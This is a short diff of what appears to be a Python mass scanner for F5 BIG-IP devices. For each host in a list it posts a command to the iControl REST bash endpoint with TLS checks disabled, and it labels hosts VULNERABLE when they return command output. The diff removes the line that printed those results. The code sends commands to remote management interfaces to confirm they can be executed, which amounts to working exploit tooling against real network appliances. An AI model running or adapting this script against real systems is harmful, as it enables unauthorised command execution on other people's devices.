@@ -42,7 +42,6 @@ try:
                 response = requests.post(url=f"https://{f5_list}/mgmt/tm/util/bash", json=data, headers=headers, verify=False, timeout=5)
                 if response.status_code == 200 and 'commandResult' in response.text:
                     print(f"{Fore.GREEN}VULNERABLE: {Fore.CYAN}https://{f5_list}")
-                    print(f"{Fore.GREEN}RESULTS: {Fore.CYAN}{display}")
                 else:
                     print(f"{Fore.RED}NOT VULNERABLE: https://{f5_list}")
             except requests.exceptions.SSLError:
